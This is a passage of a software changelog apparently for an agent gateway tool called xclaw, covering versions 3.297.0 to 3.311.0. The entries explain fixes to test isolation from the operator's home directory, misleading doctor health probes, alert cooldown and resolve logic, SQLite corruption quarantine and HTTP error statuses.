  `test/cron-anchor-restart.test.mjs`: *the target never moves further away with
  each boot*. The shipped change was not the cause. That test's fixture passes
  an explicit `paths.configDir`, so a redirected `HOME` never reaches it; the
  assertion was already flaky and the hermetic run merely changed the timing
  enough to expose it. Reproduced locally at 1 failure in 15 runs under twelve
  spinners on four cores.

  The assertion was `job.nextRunAt - t0 <= DAY`. It cannot hold. `nextRunAt` is
  `armedAt + DAY` and `armedAt >= t0` by construction, because the durable arm
  is stamped after `t0` is read — so the quantity being bounded by `DAY` is
  always at least `DAY`, and the test passes only when the arm lands inside the
  same millisecond. A zero-tolerance bound on a value that is inherently at or
  above the bound is not a check; it is a coin flip that usually lands heads.

  The deeper problem is that fixing the flake by widening the tolerance would
  have preserved a test that could never have caught its own regression. Its ten
  simulated restarts ran inside one tight loop, so the anchored target and the
  unanchored one differed only by the loop's own runtime — a few milliseconds.
  The bug it is named for is measured in hours. A scenario compressed into
  milliseconds cannot observe a defect that only becomes visible over a day of
  reboots, which is why the assertion had to be simultaneously flaky and blind:
  those are the same fact seen from two sides.

  So the ten boots are now spread over ten hours of simulated time
  (`mock.timers` with `apis: ["Date"]` only — the arm's write chain still
  settles on real promises, and mocking begins after the one `waitFor` so a
  frozen clock can never stall it). The tolerance that remains is arm-write
  latency, not slack. Both assertions were mutation-verified in both directions
  against a scheduler patched to ignore the durable `armed` stamp: the
  interval-from-arm check reports `36000000ms off` and the receding-target check
  reports `receded 600min` — exactly the ten simulated hours, which is the proof
  that the simulated clock, and not the loop's runtime, now drives the test.
  Restored byte-identically afterwards (sha256).

  Verified: 30 consecutive runs under the same twelve-spinner load that produced
  the original failure, zero failures.

## 3.311.0 (2026-08-28)

- v3.310.0 stopped three tests from writing into the operator's real
  `~/.xclaw`. It did not stop the fourth. The containment it shipped was
  per-test-file discipline — each of those tests learned to pass a `cfg` — and
  the honest reading of that fix is that the next test to call a home-default
  writer re-opens the hole exactly as those three did, silently, because a write
  to your own home directory looks like nothing at all.

  The claim v3.310.0 made was also narrower than it sounded. It was measured
  against five files. A census of what the suite actually leaves at home
  defaults found **20 paths / 11 files**, including `~/.xclaw/cron/jobs.sqlite`
  (the live cron store) and `~/.xclaw/ops-schedule.json` — the due-stamp file
  behind the six-day scheduling outage fixed in v3.283.0. Two of those are the
  files a wrong value would hurt most.

  What makes this a class rather than a list: 114 call sites under `src/` build
  a path from `os.homedir()`. Auditing them one at a time produces an allowlist
  that rots. The seam that covers all 114 at once is one environment variable —
  on POSIX `os.homedir()` returns `$HOME` when it is set — so `npm test` now
  runs `node --test` with `HOME` pointed at a throwaway directory
  (`scripts/hermetic-home.mjs`, `scripts/test-hermetic.mjs`), and the same env
  wraps the unit step of `scripts/ci-gate.mjs`. Child processes inherit it, so
  tests that spawn `bin/xclaw.mjs` are covered too. The p2 and fire-drill steps
  are deliberately left on the real home: they exercise a real install.

  Prevention, not detection, and the difference was forced by measurement. The
  first design was a guard that fails the run when the suite mutates the home.
  It cannot work on the machine it matters on: mtimes for all nine home-default
  files checked fell inside the same fifteen-minute window as a gateway restart,
  because **the gateway writes the same paths the suite writes**. Nothing at the
  file level can attribute a write to the suite, and a guard that fires on the
  gateway's own traffic gets ignored within a week. A redirect needs no
  attribution — the write cannot reach the operator, so there is nothing to
  judge. The run prints a one-line census (`# hermetic HOME: N file(s) …`,
  itemised under `XCLAW_TEST_HOME_VERBOSE=1`) for visibility, and deliberately
  does not gate on it: 20 legitimately-written paths would make that gate an
  allowlist on day one.

  Proven both directions before shipping. A re-introduced leak of exactly the
  v3.310.0 shape — `bindActionFlows` with no `cfg` — writes
  `<HOME>/.xclaw/mitm/action-bindings.jsonl` when run bare; the identical file
  run through the wrapper leaves **0 files** in the ambient home and reports 1
  in the hermetic one. The new primitive's own pins were mutated too: dropping
  the `HOME` key from `hermeticEnv` takes 3 tests RED, and flattening the
  directory walk takes 2 RED, with the source restored byte-identically
  (sha256-verified) after each.

  Also checked while the census was open, since it bears on a standing watch:
  the `jobs.sqlite` the suite creates contains `payload_jobs` with **0 rows**,
  and the live store read read-only has 0 rows too. The suite creates the cron
  schema; it has never inserted a job.

## 3.310.0 (2026-08-28)

- The clue was in the operator's own home directory: `~/.xclaw/mitm/proofs/`
  held 1214 audit bundles, ~9.6 MB, and grew by two every time the test suite
  ran. Tests were writing real proof bundles into the live install. The leak was
  not a test bug though — it was the shortest path to a defect in the shipped
  code, because a test that cannot redirect a write is usually looking at code
  that cannot be redirected at all.

  Two families of code resolve the mitm confdir. The proxy plane always threaded
  configuration through `mitmConfdir(cfg)`. The truth/sense plane dropped it at
  every single site. With `browser.mitm.confdir` set, the two halves of the same
  subsystem disagreed about which directory they were discussing:

  - `mitm_policy set` wrote block and allowlist rules into the DEFAULT directory
    while the running proxy read the CONFIGURED one. An operator adding a rule
    got a success result and an inert rule. `savePolicy` had accepted a `cfg`
    parameter since the day it was written and not one caller ever passed it.
  - `exportProofBundle` stamped `mitmEnabled:false` and the default confdir into
    every bundle regardless of configuration. An audit artifact that misreports
    its own provenance is worse than a missing one — it is evidence for a claim
    about a directory it never read.
  - Action bindings were written to one directory and read back from another, so
    require-rule evaluation saw no bindings for actions that had them, and
    `trace_score` scored a timeline that was structurally empty.

  Seven wired lines across `truth.mjs`, `sense.mjs`, `timetravel.mjs`,
  `browser-tools.mjs` and the eval scorer now carry `cfg`. Each was verified the
  only way that means anything: mutated one at a time back to the shipped form,
  with at least one named pin required to go RED for each, all four files then
  restored byte-identical by sha256 and the baseline re-proven green.

  `XCLAW_MITM_CONFDIR` outranks `cfg`, so the new pins delete it — the env var
  is exactly the input under which the cfg path is never exercised, and a test
  that leaves it set passes for the wrong reason. Same trap the v3.309.0 suite
  fell into: a fixture that pins the value which cannot exhibit the bug.

  Containment doubles as the regression pin. The tool sweep supplies its confdir
  through `cfg` alone, then asserts both halves — the sandbox received at least
  one bundle AND the operator's real `proofs/` is unchanged. Asserting only the
  second would go green if the write simply stopped happening.

  Three more suites were writing into the live install through the plane with no
  cfg seam at all: `browser-hooks` and `browser-sense` appended action bindings,
  `browser-tab-native-cdp` grew the fabric clock and commit-gate ledgers. They
  are sandboxed at the file level now. The full suite leaves `~/.xclaw`
  byte-identical.

  The 1214 stray bundles are left in place. They are operator data and they are
  the evidence for this entry; an unbounded `proofs/` directory is separately a
  job for size-gated rotation.

## 3.309.0 (2026-08-28)

- Live-driving v3.308.0 landed on the alerter, and the probe that was meant to
  confirm it worked showed the opposite. A trigger whose every target refused:

      TRIGGER  sent=false skipped=null results=[{"channel":"telegram","ok":false,"reason":"no_telegram_token"}]
      RETRY    sent=false skipped=cooldown
      RESOLVE  sent=false skipped=null
      after a FAILED trigger, lastSent = {"probe:outage":1787913791585}

  Nothing was delivered, and yet the alerter recorded the incident as both
  *sent* and *open*. Two failures follow from that one stamp, in opposite
  directions.

  `markSent()` ran after ANY delivery attempt, so a trigger nobody received
  armed the full 30-minute cooldown and every retry inside it was skipped
  `cooldown`. One Telegram blip at the moment a doctor check failed lost the
  alert silently for half an hour — precisely the moment an alerter exists for.
  The live box is exposed to exactly this: its only configured target is a
  single Telegram chat, at the default `cooldownMs` of 1800000.

  The same phantom stamp then satisfied the `not_open` gate, whose own comment
  says *"resolving a key with no recorded send would page RESOLVED for a problem
  nobody heard about"*. A failed trigger followed by a recovery did just that.

  `lastSent` was carrying two different facts — "a cooldown is armed" and "an
  incident is open" — and the failure path wrote the stamp only the success path
  had any business writing. This is the v3.286.0 lesson again in a new place:
  there, anchoring a schedule to `lastRun` could resume it but never start it,
  and the fix was a second durable epoch kept separate. Same fix here. A
  `lastDelivered` map is written only when a target actually accepted the
  message, and it alone decides whether an incident is open. `lastSent` stays
  the attempt stamp, because pacing retries is a real job and it does it well.

  A failure now buys a much shorter quiet period — `retryCooldownMs`, defaulting
  to 60s. The cooldown exists to stop an alert that landed from landing again
  every minute; it has nothing to say about one that never landed. One duplicate
  a minute during an outage beats a lost page.

  State files written before `lastDelivered` existed are migrated rather than
  dropped: under the old semantics those `lastSent` stamps meant "open", and
  discarding them would leave every incident open at upgrade time unclosable
  forever — a PagerDuty incident that never closes swallows the NEXT genuine
  outage, the worst direction to fail in.

  And the log line names the reason. `failed doctor:x` sent whoever found it at
  3am to read a JSON state file to learn whether it was a missing token, a 5xx,
  or a typo'd channel; the reasons were already in hand:

      [xclaw:alert] failed probe:outage (telegram(no_telegram_token))

- The blind spot that hid all of this was in the tests, and it is the same shape
  as v3.308.0's: they pinned the input that cannot exhibit the bug. Every
  "incident opened" in `alert-resolve-closes-incident.test.mjs` ran through a
  target that always returns `ok:false`, so the suite could not tell an alert
  that reached someone from one that reached nobody — and neither could the
  alerter. Those tests now open incidents through a target that genuinely
  delivers, and six more cover the failure path directly.

## 3.308.0 (2026-08-28)

- Live-driving v3.307.0 the same way — running `xclaw doctor` from the repo root
  and again from `/tmp`, then diffing — turned up a second kill-switch probe
  whose verdict depended on the working directory, this time in the false-alarm
  direction:

      ### from the repo root
        [OK  ] ops.stop_fire_drill: stop fire-drill passed (11 steps)
      ### from /tmp — the installed-CLI case
        [WARN] ops.stop_fire_drill: stop fire-drill failed: tls_parity

  Ten of the fire-drill's eleven steps run entirely in process. The eleventh,
  `tls_parity`, reads `src/gateway/tls.mjs` to confirm the TLS listener routes
  `/stop` through the same proxy as the plain HTTP listener — and it resolved
  that file against a caller-supplied `root` that defaulted to `process.cwd()`:

      export function fireDrillTlsParity(root) {
        const tls = path.join(root, "src/gateway/tls.mjs");
        if (!fs.existsSync(tls)) {
          return { name: "tls_parity", ok: false, reason: "missing_tls_mjs" };

  Every caller inside the repo — the CI script, both tests — computed the repo
  root module-relatively and handed it straight back. The one caller that could
  not, `xclaw doctor`, runs from wherever the operator happens to stand, so it
  fell back to the cwd, found no `src/` there, and reported the kill-switch
  drill as FAILED on a perfectly healthy install. Under a `prod` or `strict`
  profile, or with `gateway.requireAuth`, the probe promotes that to **error** —
  so the loudest red line in `doctor` on a production box was raised by the
  working directory.

  `root` is gone. `fireDrillTlsParity` resolves the file at a fixed offset from
  its own module (`src/` ships in the package), so the drill examines the same
  source in a repo, in an install, and under any cwd. The three callers that
  derived a root only to pass it back lost that code.

- `ops.stop_fire_drill` now names the reason a step failed, not just the step:
  `failed: tls_parity` could not distinguish "the TLS listener does not route
  /stop" — a real parity breach, and a genuine emergency — from "that file could
  not be read". It now reads `tls_parity(markers_absent)` or
  `tls_parity(missing_tls_mjs)`. The parity check also carries `markers_absent`
  as an explicit reason rather than a bare `ok: false`.

- The old tests were green throughout because both of them passed the drill the
  repo root explicitly, which is the one directory where the bug cannot appear —
  and the doctor test asserted only that the status was one of ok/warn/error.
  Replaced with 12 tests that pin the verdict itself: the drill and the probe
  must both pass from an unrelated cwd, a `prod` profile must not turn a healthy
  install into an error, an unreadable file must never count as a pass, a real
  parity breach must still fail, and the two must not read alike. Each of the
  four enforcement lines was mutation-verified to fail the suite.

## 3.307.0 (2026-08-28)

- Live-driving the previous release's `doctor` turned up the kill-switch probe
  lying in **both** directions. `gateway.stopRoute` decided whether `POST /stop`
  was mounted by grepping one file for marker strings:

      const gw = path.join(process.cwd(), "src/gateway/index.mjs");
      if (fs.existsSync(gw)) mounted = stopRouteMounted(fs.readFileSync(gw, "utf8"));

  From the repo root that printed a **false alarm**: the routes extraction had
  moved the mount into `src/gateway/routes/stop.mjs`, so the grep found 0
  markers and the row read `warn: gateway mount not detected` — while the live
  gateway answered `POST /stop -> 401`. A false alarm on the one route an
  operator must be able to trust is how a real one gets ignored.

  From anywhere else it printed a **fabrication**. `existsSync` was false, the
  read never happened, and `mounted` kept its initial value:

      let mounted = helperOk;

  so the row read `ok: POST /stop helper + gateway mount markers present` — a
  positive claim about a file it had never opened. That is the common case, not
  the edge: an installed `xclaw doctor` runs from the operator's own directory,
  never the repo root. The check passed hardest exactly where it checked
  nothing, and it would have said `ok` with the stop route deleted.

  The probe now reads the gateway sources relative to its own module (`src/`
  ships in the package, so this holds in a repo and in an install alike) and
  follows the actual dispatch chain in the new pure `analyzeStopMount()`: the
  dispatcher carries the markers itself, or it imports a `routes/*.mjs` that
  carries them **and calls what it imported**. A stop module left orphaned by a
  refactor — present, exporting, wired to nothing — is not a mount and no longer
  reads as one. When the sources cannot be read at all the verdict is `null`,
  reported as **warn** "gateway mount NOT verified", never `ok`.

  The old tests asserted only `helperOk`, never `mounted` or the status — which
  is how a fail-open shipped under a green suite. `test/doctor-stop-route.test.mjs`
  now pins the verdict itself (14 tests), including the orphan-module case, the
  imported-but-never-called case, and identical results from two different cwds.
  `gateway.stopProbe` still calls the live route; this is its static twin.

## 3.306.0 (2026-08-28)

- The same defect the last two releases fixed for the channel watchdog, found by
  live-driving `xclaw doctor` afterwards: it printed **two** rows under one key.

      [OK  ] computer.watchdog: active every 30000ms (in gateway)
      [OK  ] computer.watchdog: checks ok restarts=0 last=—

  The second row is fiction. The computer-server watchdog runs inside the
  gateway; the CLI runs out of process, where `watchdogStatus()` returns the
  module's untouched initial state, and the probe rendered that object as a
  measurement. `restarts=0 last=—` was never an observation of a healthy
  watchdog — it was the CLI reading counters it had never incremented, graded
  `ok`.

  It could not have been right in any run. `/gateway/info` relayed only the
  boolean `computerWatchdogActive`; `restartCount`, `lastError` and
  `consecutiveFail` had no way to cross the process boundary. A gateway watchdog
  crash-looping the computer server — 40 restarts, a live `lastError`,
  `consecutiveFail` climbing — produced that byte-identical "checks ok" row.

  `/gateway/info` now relays the (allow-listed) watchdog state, and the CLI
  builds ONE row from whichever view is real, in the new pure
  `src/computer/watchdog-report.mjs`:

  - `consecutiveFail` past the threshold → **error**, "cannot restart the
    computer server", with the last error.
  - a `lastError` → **warn**, with the real restart count.
  - relayed and healthy → the gateway's own `restarts=` / `lastCheck=`.
  - gateway up, watchdog NOT active → **error**: a computer server that dies
    will not be restarted. It no longer says "start gateway" — a relayed value
    exists only because a gateway answered.
  - gateway up but relaying nothing (older build, or the relay threw) → **warn**.
    Unknown is not healthy.
  - gateway genuinely down → warn, and no invented counters.

- `eval.cron` carried the same wrong advice: "not registered (start gateway)"
  was reachable with the gateway up. It now says the evals will not run and to
  restart the gateway it just talked to.

## 3.305.0 (2026-08-28)

- 3.303.0 wired `ops.channelWatchdog` into `xclaw doctor` so the out-of-process
  CLI could finally see the gateway's channel watchdog. That fixed the
  `running: true` half. A relayed `running: false` still fell through the same
  branch as "no gateway at all", so a watchdog that was OFF inside a live
  gateway printed:

      [OK  ] channels.health: channel watchdog idle (start gateway to enable)

  Both halves of that line were wrong. `liveOps` only exists because the gateway
  ANSWERED `/gateway/info` — so doctor told the operator to start the gateway
  that had just served the request the verdict was built from. And it graded the
  condition `ok`: the watchdog is what restarts a channel whose poll loop has
  exited and what raises `channel-outage:<name>` / `channel-circuit-open:<name>`.
  While it is off, a dead channel stays dead and no alert is ever raised.

- `summarizeChannelHealth` now separates four states instead of collapsing them:

      gateway down                     -> ok    "idle (start gateway to enable)"  (unchanged)
      gateway up, watchdog NOT running -> error "NOT running inside a live gateway"
      gateway up, disabled by config   -> warn  names channels.healthWatchdog.enabled
      gateway up, relayed nothing      -> warn  unknown is not healthy

  The last one covers a gateway whose relay threw (`channelWatchdog: null`) or a
  build predating the relay — previously indistinguishable from a healthy box.

- The watchdog now records WHICH reason it is not running. `running: false` was
  the same value for "the operator switched it off" and "it should be running
  and is not", so no reader could grade them differently. `startChannelHealthWatchdog`
  sets a `disabled` flag when config declines the start and clears it on a
  successful start; `stopChannelHealthWatchdog` clears it, because an explicit
  stop is not a config opt-out. `channelHealthStatus()` and the `/gateway/info`
  projection both relay it.

- `summarizeChannelHealth` takes `gatewayUp` as a third argument (defaulting to
  `Boolean(liveOps)`, so existing callers are unchanged). A gateway can be up and
  still relay no ops block; "the gateway is down" is the only case where "start
  gateway" is the right advice, and only the caller knows it. The doctor passes
  the real answer from its `/health` probe.

- 8 tests. Both new decisions mutation-verified in both directions: forcing the
  live-gateway branch off fails 6 of 7 report tests, and dropping the `disabled`
  flag fails the watchdog test.

## 3.304.0 (2026-08-28)

- Every gateway version surface answered "what version are you?" by reading
  `package.json` off disk *during the request*. On a box with a self-deployer
  that is not the running build. Captured live on this host, one gateway, one
  moment:

      /version      -> 3.303.0    (disk, read during the request)
      /gateway/info -> 3.302.0    (frozen at import = the build executing)
      /health       -> 3.302.0
      uptimeSec 757, startedAt 09:08:38Z — never restarted since the bump

  `/version` named a build that had never executed on this machine.
- Six sites, four of them byte-near-identical `pkgVersion()` copies: `/version`,
  the Control UI dashboard, the Prometheus `xclaw_info` gauge, the markdown
  status report, stop-health's `surfaceVersion` fallback, and the stamp on the
  gateway's own doctor report. The metrics gauge is the dangerous one —
  `xclaw_info{version="…"}` is what a scraper reads to confirm a rollout
  reached a host, so a process that had never restarted could report itself as
  upgraded and satisfy its own deploy check.
- One primitive now owns the read: `src/gateway/build-version.mjs`, imported
  **statically** by the gateway so it is evaluated at process boot. A module
  that memoizes on first *dynamic* import inside a route handler would freeze
  whatever was on disk at the first request — the same bug with extra steps.
- The drift is published rather than hidden, because it is the normal state
  between a deploy and its restart. `/version` gains `onDiskVersion`, `stale`,
  and `staleReason` (`restart-pending` when the checkout moved ahead,
  `checkout-behind` when the process is ahead of its source), and `xclaw
  doctor` gains a `gateway.build` probe naming the restart. `version` keeps its
  name and now carries the truth; every addition is additive.
- Drift is a `warn`, never an `error` — an operator mid-deploy must not be told
  the box is broken. An unreadable `package.json` yields `onDiskVersion: null`
  and `stale: false`: a failed read is not evidence of drift, and inventing one
  would page someone over a permissions error.
- Pinned by a call-graph test as well as behaviour. In-process a disk read and
  `runningVersion()` return the same string, so nothing at runtime distinguishes
  a correct call from a reintroduced copy — the test asserts instead that no
  file under `src/gateway/` reads `package.json` for a version except the
  primitive itself (and stop-health, for the `xclaw.stopSurfaceFreeze` marker,
  which genuinely is a disk fact).
## 3.303.0 (2026-08-28)

- `xclaw doctor` reported the channel watchdog as idle on a box where it was
  demonstrably running. One live run, three lines from the same output:

      [OK  ] computer.watchdog: active every 30000ms (in gateway)
      [OK  ] eval.cron: registered (in gateway)
      [OK  ] channels.health: channel watchdog idle (start gateway to enable)

  while `/gateway/info` returned `ops.channelWatchdogRunning: true`. That `ops`
  block exists precisely to kill this lie — it shipped with three fields, and
  only two were ever wired into the doctor. `channelWatchdogRunning` had zero
  consumers repo-wide: written on one line, read on none.
- The wording was the harmless half. The probe branched on its OWN process's
  `running`, which is false in the CLI by construction (the watchdog lives in
  the gateway), so it took the idle branch and never reached `ch.channels` at
  all. A channel sitting in a poll outage (`outageSince`) or one whose restart
  circuit had latched open (`circuitAlerted`) could not be surfaced by the CLI
  under any circumstances — and the watchdog pages the operator for both
  (`channel-outage:<name>`, `channel-circuit-open:<name>`), so `ok` here
  contradicted an alert xclaw itself had already sent.
- `/gateway/info` now relays `ops.channelWatchdog` — the per-channel state
  behind an explicit allow-list, not a spread, because `channelState` entries
  are an internal map free to grow fields and a public route must not start
  publishing them by accident. The `channelWatchdogRunning` boolean stays: it
  shipped on a public surface.
- Doctor consults that relay exactly as `computer.watchdog` and `eval.cron`
  already do, and escalates what the watchdog paged for — `warn` on an outage,
  `error` on an open circuit (which outranks an outage elsewhere). The decision
  lives in `src/channels/health-report.mjs` as two pure functions, because a
  probe written inline in `runDoctor` is untestable by construction: it calls
  `loadConfig()` itself.
- Dead import removed: `src/gateway/index.mjs` imported `channelHealthStatus`
  and never called it.

## 3.302.0 (2026-08-28)

- The same live-`~/.xclaw` leak, one module over: alert state. v3.300.0 taught
  `defaultStatePath()` to honour `paths.configDir`, but the other half of that
  `||` still resolved to `os.homedir()/.xclaw` — and every remaining leak
  reaches the alerter through src/ indirection that the text-rule guard in
  `test/alerter-test-isolation.test.mjs` cannot see by construction:
  `getSharedAlerter(cfgRef || {})` (health-watchdog:93), `job._cfg || {}`
  (scheduler:243), `cfg || {}` (eval-job:97, doctor-job:62). The operator's
  `alert-state.json` was 100 entries deep with ZERO real deliveries in it — 12
  `cron:job`, 12 `enforcement:a.bundle_navigate_hook`, 12
  `live-e2e:live.commit_gate`, 62 `self-deploy:*`, every one a fixture key and
  every one `skipped:"no_targets"` (the live config carries a real telegram
  target, so a production caller could not have produced them).
- This is destructive, not merely untidy. `saveState` keeps `history.slice(-100)`,
  so each fixture write EVICTS a real forensic record 1:1; and `markSent`
  persists `lastSent[key]` into the same file, so a non-production caller can
  stamp the live cooldown map and suppress a genuine page for a full
  `cooldownMs` (30 min default). The live map already held `fire-drill:ping`,
  `alert-path-live-test` and `cron:job-alpha`.
- `loadConfig()` stamps `paths.configDir` unconditionally, so a cfg without one
  is never a real caller. `defaultStatePath()` now returns `null` there, `status()`
  reports `statePath: null`, and the alerter keeps its bounded state in memory —
  it delivers, cools down and records history exactly as before, it just owns no
  file. An explicit `alerting.statePath` and a real install are unchanged. Same
  shape as `appendCronEvent`'s `no_config` guard shipped in 3.301.0.
- Deleted `test/alerter-test-isolation.test.mjs`. It scanned test sources for
  inline alerting configs that named no state path, and its whole premise —
  "send() would write `~/.xclaw/alert-state.json`" — is now false: a runtime
  guard supersedes a text rule that could only ever see literals, never the
  indirection that caused the actual damage. Its two pinned exceptions in
  `test/alert-state-config-dir.test.mjs` went with it; that file's last case now
  asserts the reverse of what it originally pinned, and says why.

## 3.301.0 (2026-08-28)

- The test suite was writing into the operator's live `~/.xclaw`. `loadConfig()`
  stamps `paths.configDir` on every real config and ~20 stores resolve through
  it — which is exactly what lets a test redirect its whole world into a temp
  dir. `src/cron/logs.mjs` never read it: both `cronEventsLogPath` and
  `doctorLogPath` went straight to `os.homedir()/.xclaw`. So
  `test/cron-anchor-restart.test.mjs`, which DOES scope itself correctly, still
  appended its fixture events — `"error":"suite exploded"` among them — into the
  production `cron-events.log`, ~1031 lines of them. The test was right; the
  module ignored it. Both resolvers now go through the same `cronStoreRoot(cfg)`
  helper as `cronLedgerFile`, which is behaviour-identical in production where
  `configDir` IS `~/.xclaw`.
- The doctor / eval / live-e2e cron writers each carried their own private
  `defaultLogPath()` hard-coded to the home dir; all three now resolve through
  one `cronLogPath(cfg, file)`. The doctor one was more than a scoping hazard:
  its READER (`monitorCronLogs` → `doctorLogPath`) honoured
  `doctor.cron.logPath` while its writer ignored it, and `xclaw doctor-cron`
  passes no explicit path — so an operator who configured a doctor log had runs
  written to one file and tailed from another. Reader and writer share a
  resolver now, and three unused `node:os` imports go with the duplication.
- `legacyCronJsonFile` had the same hard-coding while its sibling three lines up
  honoured `configDir`, so a scoped caller would have absorbed the OPERATOR'S
  legacy job file — and renamed it to `.bak` — instead of its own.
- `appendCronEvent` refuses to write when handed a bare cfg. `scheduler.mjs`
  logs through `job._cfg || {}`, so a job that lost its config previously fell
  through to whatever `os.homedir()` happened to be. A bare `{}` is by
  construction never a real caller, so it now writes nowhere and says so
  (`{skipped:"no_config"}`) rather than guessing. It also returns the path it
  wrote and surfaces append failures instead of only logging them — a failed
  append is now visible to its caller. Same guard as
  `src/providers/model-stats.mjs`.
- `evalCronStatus()` reports the log path its writer would actually use: it
  takes a cfg now, and all five callers (dashboard, `GET /cron/eval`, ops
  status, doctor, `xclaw eval-schedule status`) pass the one they already hold.
  It previously named the home-dir default no matter how the config was scoped.
  Worth recording how close this went the other way: threading cfg through
  briefly left `defaultLogPath(opts.cfg)` inside a function with no `opts`, and
  the full suite stayed green — nothing exercises this function, and three of
  its five callers swallow the throw in a bare `catch {}`, so only the HTTP
  route would have shown it, as a 500. It now has a direct test.
- The v3.270.0 fix landed on one call site, not the class: the gateway got
  `startCron(cfg)` but `bin/xclaw.mjs` still had three bare `startCron()` calls
  (`cron`, `live-e2e-schedule`, `eval-schedule`). Every payload job those
  re-hydrated ran with a null config — default model and the $15 no-config
  governor fallback, the same shape as the incident that paused the live
  governor against a $60 operator cap. All three now pass the loaded config, and
  a test pins the absence of a bare call in both the gateway and the CLI.

## 3.300.0 (2026-08-28)

- Incidents that alert on entry now alert on EXIT. Three latched conditions
  raised a page and never closed it: `channel-outage:<ch>`, the restart
  circuit `channel-circuit-open:<ch>`, and every `slo:<breach>`. PagerDuty
  dedups on `dedup_key`, so an incident left open by a blip days ago folds the
  next genuine outage's trigger into itself and does NOT re-notify — an
  incident that never closes is a fail-open on paging, not a stale row.
- Closing one correctly needs two non-obvious bypasses, which is why it now
  lives on the alerter as a primitive (`alerter.resolve()`) rather than being
  hand-rolled per call site: the cooldown (30 min default) is longer than most
  outages, so a cooldown-gated resolve would never be delivered at all; and
  `minSeverity` (default `error`) swallows anything sent at `info`. Both call
  sites that tried it by hand got it wrong — the SLO monitor's recovery branch
  sent at `severity:"info"` under a *different* key (`slo:resolve:<b>`), so for
  its whole life it opened a second incident, left the first open forever, and
  its only observable effect was pushing a `skipped` entry onto its own return
  value.
- A resolve CLEARS the open marker instead of re-arming it. `markSent()` on a
  resolve would have been the second bug in the fix: it would suppress the next
  genuine trigger for a full cooldown. And a resolve for a key that was never
  opened is skipped `not_open` — no "RESOLVED" page for a problem nobody heard
  about.
- The watchdog branches explicitly on `typeof alerter.resolve === "function"`
  with a `send({ eventAction:"resolve" })` fallback. `a?.resolve?.(…)` would
  have silently no-opped against any alerter predating the primitive — the
  exact fail-open shape being fixed here.
- Nine mutations, one per shipped enforcement line (cooldown bypass, marker
  clear, `not_open` gate, severity bypass, PagerDuty `event_action`, both
  watchdog resolve call sites, the `circuitAlerted` latch, the SLO key and
  severity): all nine turn the suite RED, none survives.

## 3.299.0 (2026-08-28)

- Quarantine now keeps the `-wal` and `-shm` it promised to keep. Spec §11.18
  says a corrupt database is copied aside and the original is never deleted,
  but the openers handed the file to SQLite FIRST and only quarantined in the
  `catch` — and SQLite's own failed open can unlink the sidecars on its way
  out. A corrupt main file plus a hot WAL went in and one file came out, so
  quarantine had nothing left to copy and the committed-but-uncheckpointed
  transactions in that WAL — the most recoverable data there is — were gone.
- Found as a CI-only failure: the `openControlPlane` §11.18 test went red on
  the `24.15` matrix leg at v3.298.0 while the Node binary was byte-identical
  to the four green commits before it. Adding a test file shifted `node --test`
  worker scheduling, which shifted load, which exposed a latent race. Local
  repro: 300/300 correct unloaded, 1 failure in 300 under 12 spinners on 4
  cores, with the sample directory proving `-wal`/`-shm` had been unlinked
  from the ORIGINAL directory, not just missed by the copy.
- Fixed as a primitive, not a patch: `notADatabaseError` peeks at the 16-byte
  `SQLite format 3\0` header and `refuseNotADatabase` quarantines and throws
  before SQLite ever touches the file. The refusal is now deterministic
  instead of a race with SQLite's cleanup, and costs one 16-byte read per
  open. Missing and zero-length files stay non-errors — SQLite creates the one
  and treats the other as a brand-new empty database, and so does the guard.
- Wired into all three openers with the same defect shape, not only the one
  the test caught: `openControlPlane`, `openMemoryIndex`, `openAgentStore`.
- The regression test pins the guard by the path in the refusal message —
  SQLite's own refusal is the bare `file is not a database`. The data loss it
  prevents lands ~1 run in 300 and only under load, so asserting the sidecars
  survive cannot fail reliably; asserting the refusal came from before the
  open can. Mutation-verified both directions on all three openers.

## 3.298.0 (2026-08-28)

- Caller-side errors answer 4xx instead of 500. Found by live-driving the
  gateway: `POST /channel/webchat/message` with `{"text": "..."}` — the route
  wants `message` — returned HTTP 500, telling the caller the SERVER had
  failed. That is not cosmetic. This repo's own HTTP client retries 500 by
  default (`retryOnHttp = [408, 425, 429, 500, 502, 503, 504]` in
  `utils/fetch-retry.mjs`, `isRetryableStatus` in `utils/backoff.mjs`), so a
  request that can never succeed burns its whole retry budget, and the 5xx
  rate operators page on climbs for a caller-side typo.
- The obvious fix, `json(res, err.status || 500)`, would have introduced a
  worse bug than it closed. `err.status` already means the status of an
  OUTBOUND response in ~19 places, and two of them reach a gateway catch:
  `providers/failover-router.mjs` sets `err.status = 401` for "No credentials
  for <model>" — a SERVER misconfiguration, so echoing 401 sends the caller to
  re-authenticate a token that was never the problem — and `agent/provider.mjs`
  copies the upstream provider's status (429, 503) onto the error, which would
  make an upstream rate limit look like ours.
- So the 4xx rides on a brand an upstream error can never carry, not on the
  overloaded field: `src/shared/http-error.mjs` exports `clientError` /
  `badRequest` / `clientErrorStatus`, branding with a module-private `Symbol`
  (defined, not `Symbol.for`, so unreachable from the global registry) set
  non-enumerable so it survives neither `JSON.parse(JSON.stringify(err))` nor a
  structured clone. A caller cannot forge one by sending `{status: 400}`.
- All seven gateway catches now answer `clientErrorStatus(err) ?? 500`,
  including the outermost request catch in `gateway/index.mjs`, where every
  route's uncaught throw lands. Behaviour is unchanged for every error that is
  not explicitly branded. Deliberate 502/503 responses are left alone: they
  name which dependency failed and are honest; 500 was the one that collapsed
  every error class into "the server broke".
- Pinned two ways, both mutation-verified: an error carrying `err.status = 401`
  must still answer 500, and no gateway response may hard-code 500.

## 3.297.0 (2026-08-28)

- Alert state follows `paths.configDir`. `defaultStatePath()` resolved
  `~/.xclaw/alert-state.json` from `os.homedir()` alone, while ~40 sibling
  stores in `src/` resolve `cfg?.paths?.configDir || <home>`. Alert state is
  the cooldown map plus the delivery history, so two xclaw instances on one
  host with different config dirs shared one cooldown map: instance B's alert
  was suppressed as `cooldown` by instance A's — silent alert loss, the same
  class as the stale-config watcher above.
- It also meant the test suite wrote into the operator's real
  `~/.xclaw/alert-state.json`. Confirmed on the live box: running
  `test/self-mod.test.mjs` — which correctly isolates `paths.configDir` —
  changed the live file's sha256 (36286 -> 36047 bytes). The 100 `no_targets`
  entries in the live alert history were therefore test output, not the
  deployer's, which is why that history was unusable as evidence for 3.295.0;
  the 3.295.0 entry below has been corrected to cite the out-of-process live
  drive instead. An explicit `alerting.statePath` still wins, and with no
  `paths.configDir` the home path remains the fallback — no change for a
  normal install.
- Fixing the module was not fixing the class: `test/alerting-b4.test.mjs`
  passed no config dir at all, so it still landed on the home fallback and
